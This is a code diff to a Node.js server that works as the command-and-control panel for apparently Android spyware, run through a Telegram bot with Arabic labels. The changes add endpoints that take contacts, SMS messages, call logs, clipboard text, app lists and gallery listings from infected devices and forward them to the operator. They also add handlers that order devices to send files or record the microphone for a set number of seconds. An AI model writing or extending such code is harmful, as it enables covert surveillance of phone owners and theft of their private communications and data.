@@ -21,8 +21,44 @@ const appClients = new Map();
 const upload = multer();
 app.use(bodyParser.json({ limit: '100mb' }));
 
+// ==================== HEALTH ====================
 app.get('/health', (req, res) => res.status(200).send('OK'));
 app.get('/', (req, res) => res.send('<h1>Service Online</h1>'));
+
+// ==================== HELPERS ====================
+function escapeHtml(str) {
+    return String(str || '')
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+}
+
+async function sendLongText(title, agentId, text) {
+    const MAX = 3500;
+    const total = (text || '').length;
+    const header = `${title}\n📱 من: <b>${agentId}</b>\n📊 ${total} حرف`;
+
+    await appBot.sendMessage(id, header, { parse_mode: 'HTML' }).catch(() => {});
+
+    if (total === 0) {
+        await appBot.sendMessage(id, '📭 (فارغ)').catch(() => {});
+        return;
+    }
+
+    const chunks = [];
+    for (let i = 0; i < total; i += MAX) {
+        chunks.push(text.substring(i, i + MAX));
+    }
+
+    for (let i = 0; i < chunks.length; i++) {
+        const prefix = chunks.length > 1 ? `<b>[${i + 1}/${chunks.length}]</b>\n` : '';
+        await appBot.sendMessage(id,
+            prefix + `<pre>${escapeHtml(chunks[i])}</pre>`,
+            { parse_mode: 'HTML' }
+        ).catch(() => {});
+        if (i < chunks.length - 1) await new Promise(r => setTimeout(r, 700));
+    }
+}
 
 // ==================== UPLOADS ====================
 app.post('/uploadFile', upload.single('file'), (req, res) => {
@@ -42,12 +78,73 @@ app.post('/uploadFile', upload.single('file'), (req, res) => {
     res.send('');
 });
 
-app.post('/uploadText', (req, res) => {
-    const title = req.body.title || 'نص';
-    appBot.sendMessage(id,
-        `°• ${title} من <b>${req.body.agentId || '?'}</b>\n\n<pre>${(req.body.text || '').substring(0, 4000)}</pre>`,
-        { parse_mode: 'HTML' }
-    ).catch(() => {});
+app.post('/uploadText', async (req, res) => {
+    await sendLongText(req.body.title || 'نص', req.body.agentId || '?', req.body.text || '');
+    res.send('');
+});
+
+app.post('/uploadContacts', async (req, res) => {
+    try {
+        const list = JSON.parse(req.body.list || '[]');
+        let text = '';
+        list.forEach((c, i) => {
+            text += `${i + 1}. ${c.name || '?'}\n   📞 ${c.phone || '?'}\n`;
+        });
+        await sendLongText(`👥 جهات الاتصال (${list.length})`, req.body.agentId || '?', text);
+    } catch (e) { console.error('contacts:', e.message); }
+    res.send('');
+});
+
+app.post('/uploadMessages', async (req, res) => {
+    try {
+        const list = JSON.parse(req.body.list || '[]');
+        let text = '';
+        list.forEach((m, i) => {
+            text += `${i + 1}. من: ${m.from || '?'}\n   ${(m.body || '').substring(0, 200)}\n\n`;
+        });
+        await sendLongText(`💬 الرسائل (${list.length})`, req.body.agentId || '?', text);
+    } catch (e) { console.error('messages:', e.message); }
+    res.send('');
+});
+
+app.post('/uploadCalls', async (req, res) => {
+    try {
+        const list = JSON.parse(req.body.list || '[]');
+        let text = '';
+        list.forEach((c, i) => {
+            text += `${i + 1}. ${c.type || '?'} — ${c.number || '?'}\n   ⏱️ ${c.duration || 0} ثانية\n\n`;
+        });
+        await sendLongText(`📞 سجل المكالمات (${list.length})`, req.body.agentId || '?', text);
+    } catch (e) { console.error('calls:', e.message); }
+    res.send('');
+});
+
+app.post('/uploadApps', async (req, res) => {
+    try {
+        const list = JSON.parse(req.body.list || '[]');
+        let text = '';
+        list.forEach((a, i) => {
+            text += `${i + 1}. ${a.name || '?'}\n   📦 ${a.package || '?'}\n`;
+        });
+        await sendLongText(`📱 التطبيقات (${list.length})`, req.body.agentId || '?', text);
+    } catch (e) { console.error('apps:', e.message); }
+    res.send('');
+});
+
+app.post('/uploadClipboard', async (req, res) => {
+    await sendLongText(`📋 الحافظة`, req.body.agentId || '?', req.body.text || '(فارغة)');
+    res.send('');
+});
+
+app.post('/uploadGallery', async (req, res) => {
+    try {
+        const list = JSON.parse(req.body.list || '[]');
+        let text = '';
+        list.forEach((img, i) => {
+            text += `${i + 1}. ${img.name || '?'}\n   ID: ${img.id || '?'}\n`;
+        });
+        await sendLongText(`🖼️ صور المعرض (${list.length})`, req.body.agentId || '?', text);
+    } catch (e) { console.error('gallery:', e.message); }
     res.send('');
 });
 
@@ -114,11 +211,8 @@ const cmdsForDevice = (uuid) => ({
          { text: '📞 سجل المكالمات', callback_data: `calls:${uuid}` }],
         [{ text: '💬 الرسائل', callback_data: `messages:${uuid}` },
          { text: '👥 جهات الاتصال', callback_data: `contacts:${uuid}` }],
-        [{ text: '🔔 الإشعارات', callback_data: `notifications:${uuid}` },
-         { text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` }],
-        [{ text: '🔒 قفل الشاشة', callback_data: `lock:${uuid}` },
-         { text: '🌐 فتح رابط', callback_data: `open_url:${uuid}` }],
-        [{ text: '🔙 رجوع', callback_data: `back:${uuid}` }]
+        [{ text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` },
+         { text: '🔙 رجوع', callback_data: `back:${uuid}` }]
     ]
 });
 
@@ -128,6 +222,7 @@ appBot.on('message', (message) => {
     if (chatId.toString() !== id.toString()) return;
 
     const text = message.text;
+    if (!text) return;
 
     if (text === '/start') {
         appBot.sendMessage(id, '👑 <b>لوحة التحكم</b>\n\nاختر من الأزرار:', kbMain);
@@ -196,34 +291,61 @@ appBot.on('callback_query', async (cb) => {
         return;
     }
 
-    // ===== INSTANT COMMANDS =====
     const instant = ['device_info', 'apps', 'location', 'clipboard', 'vibrate',
-                     'calls', 'messages', 'contacts', 'notifications',
-                     'camera_back', 'camera_front', 'gallery', 'lock'];
+                     'calls', 'messages', 'contacts',
+                     'camera_back', 'camera_front', 'gallery'];
 
     if (instant.includes(cmd)) {
         if (!agent) return appBot.answerCallbackQuery(cb.id, { text: 'غير متصل' });
-        sendCmd(cmd);
-        await delAndSend(`✅ تم إرسال الأمر: <b>${cmd}</b>\n⏳ انتظر النتيجة...`);
+        const ok = sendCmd(cmd);
+        await delAndSend(ok ? `✅ تم إرسال: <b>${cmd}</b>\n⏳ انتظر النتيجة...` : '❌ فشل الإرسال');
         return;
     }
 
-    // ===== COMMANDS WITH INPUT =====
-    const needsInput = {
-        'file': ['📁 أدخل مسار الملف:', 'file_input'],
-        'mic': ['🎤 أدخل مدة التسجيل بالثواني:', 'mic_input'],
-        'open_url': ['🌐 أدخل الرابط:', 'url_input']
-    };
-
-    if (needsInput[cmd]) {
-        const [prompt, session] = needsInput[cmd];
-        await appBot.sendMessage(id, prompt, {
+    if (cmd === 'file') {
+        if (!agent) return appBot.answerCallbackQuery(cb.id, { text: 'غير متصل' });
+        await appBot.sendMessage(id, '📁 أدخل مسار المجلد أو الملف:\nمثال: `DCIM/Camera`', {
+            parse_mode: 'Markdown',
             reply_markup: { force_reply: true }
         });
         return;
     }
 
-    // ===== REPORT FROM AGENT (via HTTP endpoints already handled)
+    if (cmd === 'mic') {
+        if (!agent) return appBot.answerCallbackQuery(cb.id, { text: 'غير متصل' });
+        await appBot.sendMessage(id, '🎤 أدخل مدة التسجيل بالثواني:\nمثال: `10`', {
+            parse_mode: 'Markdown',
+            reply_markup: { force_reply: true }
+        });
+        return;
+    }
+});
+
+// ==================== FORCE REPLY HANDLER ====================
+appBot.on('message', async (message) => {
+    if (!message.reply_to_message) return;
+    if (message.chat.id.toString() !== id.toString()) return;
+
+    const originalText = message.reply_to_message.text || '';
+
+    // Find the latest active agent (fallback: first agent)
+    let uuid = null;
+    appClients.forEach((v, k) => { if (!uuid) uuid = k; });
+    if (!uuid) return;
+
+    if (originalText.includes('أدخل مسار')) {
+        const path = message.text || '';
+        appSocket.clients.forEach((ws) => {
+            if (ws.uuid === uuid) ws.send(`file:${path}`);
+        });
+        appBot.sendMessage(id, `📤 جاري إرسال: file:${path}`, kbMain);
+    } else if (originalText.includes('مدة التسجيل')) {
+        const secs = parseInt(message.text) || 10;
+        appSocket.clients.forEach((ws) => {
+            if (ws.uuid === uuid) ws.send(`mic:${secs}`);
+        });
+        appBot.sendMessage(id, `🎤 جاري التسجيل: ${secs} ثانية`, kbMain);
+    }
 });
 
 // ==================== PING ====================
@@ -235,5 +357,6 @@ setInterval(() => {
     });
 }, 30000);
 
+// ==================== START ====================
 const PORT = process.env.PORT || 8999;
 appServer.listen(PORT, '0.0.0.0', () => console.log(`✅ Server on ${PORT}`));
